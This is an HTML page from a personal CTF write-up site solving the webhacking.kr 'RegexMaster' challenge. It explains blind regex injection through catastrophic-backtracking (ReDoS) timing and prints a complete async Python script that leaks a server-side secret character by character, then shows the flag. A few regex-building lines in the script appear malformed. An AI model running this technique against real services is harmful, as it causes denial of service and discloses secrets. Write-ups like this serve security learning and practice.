@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>RegexMaster | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="RegexMaster" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/RegexMaster.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/RegexMaster.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="RegexMaster" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"RegexMaster","url":"http://localhost:4000/CTF_writeups/webhacking.kr/RegexMaster.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="webhacking-regexmaster-solution">Webhacking RegexMaster Solution</h1>
+
+<p>In this challange we exploit regex injection.</p>
+
+<p>I used this paper <a href="https://diary.shift-js.info/blind-regular-expression-injection/">Blind Regex Injection</a>.</p>
+
+<p>If we’ll supply this input: <code class="language-plaintext highlighter-rouge">?pattern=^(?=F)((.*)*)*salt$</code>, then it first checks whether the first char is <code class="language-plaintext highlighter-rouge">F</code>, and if so, goes to this loop: <code class="language-plaintext highlighter-rouge">((.*)*)*</code>, which makes it do backtracking till collapsing in the backend.</p>
+
+<p>For example: <code class="language-plaintext highlighter-rouge">?pattern=^(?=..A)((.*)*)*salt$</code> -&gt; <em>Takes time</em> (3rd char is <code class="language-plaintext highlighter-rouge">A</code>)</p>
+
+<p>In our side, all we can see is that on the right char it got delayed:
+<img src="/CTF_writeups/webhacking.kr/images/RegexMaster_burp.png" alt="Burp image" /></p>
+
+<p>So, let’s write our script: [regexMaster.py]</p>
+<pre><code class="language-scripts/regexMaster.py">import asyncio
+import aiohttp
+import random
+import string
+import time
+import re
+
+# Constants
+URL = "http://218.145.226.8:20001"
+SESSION_ID = "fsjfd38r8f4a723sl4tojnv75l"
+cookies = {'PHPSESSID': SESSION_ID}
+TIME_THRESHOLD = 2.0  # seconds
+
+# Utilities (copied from the first script)
+def length_in(i, j):
+    return ".{" + str(i) + "," + str(j) + "}$"
+
+def nth_char_in(n, S):
+    # Create a range pattern for subsets, e.g., [\x01-\x56]
+    if len(S) &gt; 1:  # More than one character, we can define a range
+        lower = min(S)
+        upper = max(S)
+        return f".}[\\x{lower:02x}-\\x{upper:02x}].*$"
+    else:  # Single character, no range
+        return f".}[{re.escape(chr(S[0]))}].*$"
+
+def redos_if(regexp, salt):
+    return f"^(?={regexp})(((.*)*)*)*{salt}"
+
+def generate_salt():
+    return ''.join(random.choices(string.ascii_letters, k=10))
+
+# Async version of get_request_duration
+async def get_request_duration(session, payload):
+    params = {'pattern': payload}
+    timeout = aiohttp.ClientTimeout(total=10)
+    try:
+        start = time.monotonic()
+        async with session.get(URL, params=params, timeout=timeout) as response:
+            await response.text()
+        end = time.monotonic()
+        return end - start
+    except asyncio.TimeoutError:
+        return 999  # Return a high value to signify timeout
+
+async def prop_holds(session, prop, salt):
+    payload = redos_if(prop, salt)
+    duration = await get_request_duration(session, payload)
+    return duration &gt; TIME_THRESHOLD
+
+async def main():
+    async with aiohttp.ClientSession(cookies=cookies) as session:
+        # Generate a salt that triggers a slowdown
+        print("[*] Searching for effective salt...")
+        salt = generate_salt()
+        while not await prop_holds(session, '.*', salt):
+            salt = generate_salt()
+        print(f"[+] Salt found: {salt}")
+
+        # Leak secret length
+        lower_bound = 0
+        upper_bound = 100
+        print("[*] Starting length detection...")
+        while lower_bound != upper_bound:
+            m = (lower_bound + upper_bound) // 2
+            if await prop_holds(session, length_in(lower_bound, m), salt):
+                upper_bound = m
+            else:
+                lower_bound = m + 1
+            print(f"[*] Length bounds: ({lower_bound}, {upper_bound})")
+        secret_length = lower_bound
+        print(f"[+] Leaked length: {secret_length}")
+
+        # Leak the secret character by character
+        # Considering all ASCII characters (0-255)
+        S = bytes(range(256))  # All ASCII characters
+        secret = ""
+        print("[*] Starting character leak...")
+        for i in range(len(secret), secret_length):
+            lower_bound = 0
+            upper_bound = len(S) - 1
+            while lower_bound != upper_bound:
+                m = (lower_bound + upper_bound) // 2
+                subset = S[lower_bound:m+1]
+                if await prop_holds(session, nth_char_in(i + 1, subset), salt):
+                    upper_bound = m
+                else:
+                    lower_bound = m + 1
+            secret += chr(S[lower_bound])  # Convert to character
+            print(f"[+] Secret so far: {secret}")
+        print(f"[+] Final secret: {secret}")
+
+if __name__ == "__main__":
+    asyncio.run(main())
+
+</code></pre>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FLAG{im_r/e/g/e/x_master//_//}</code></em></strong></p>
+
+
+      </section>
+    </div>
+  </body>
+</html>
